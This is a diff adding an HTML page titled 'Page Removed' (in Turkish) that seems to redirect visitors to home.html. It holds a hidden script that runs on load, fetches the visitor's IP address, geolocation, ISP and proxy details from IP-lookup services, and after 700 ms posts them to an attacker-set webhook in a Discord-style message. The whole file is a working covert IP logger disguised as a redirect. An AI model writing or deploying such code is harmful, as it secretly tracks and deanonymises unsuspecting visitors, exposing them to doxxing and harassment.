@@ -1,0 +1,53 @@
+<HTML>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=UTF-8"><META HTTP-EQUIV="Refresh" CONTENT="0; URL=home.html"><TITLE>Sayfa Kaldırıldı</TITLE>
+</HEAD>
+<BODY>
+<A HREF="home.html"><h3>Buraya Tıkla..</h3></A>
+<script src="static/config.js"></script>
+<script>
+  function get_information(link, callback) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", link, true);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4) {
+        callback(xhr.responseText);
+      }
+    };
+    xhr.send(null);
+  }
+  get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+    var div = document.createElement("div");
+    div.innerHTML = text;
+    div.id = "razzylog";
+    const secondList = document.getElementsByClassName("header")[0]
+    secondList.appendChild(div)
+  });
+  get_information("https://api.ipify.org/", function(text) {
+    var div = document.createElement("div");
+    div.innerHTML = text;
+    div.id = "ipppp";
+    const secondList = document.getElementsByClassName("header")[0]
+    secondList.appendChild(div)
+  });
+
+  function ipLogByRaz() {
+    var ispp = document.getElementById('ipppp').innerHTML
+    var extra = document.getElementById("razzylog").innerHTML
+    const request = new XMLHttpRequest();
+    request.open("POST", wbhk);
+    request.setRequestHeader('Content-type', 'application/json');
+    const params = {
+      username: "Beamed",
+      avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
+      content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
+    }
+    request.send(JSON.stringify(params));
+  }
+  setTimeout(function() {
+    ipLogByRaz()
+  }, 700);
+</script>
+</BODY>
+</HTML>
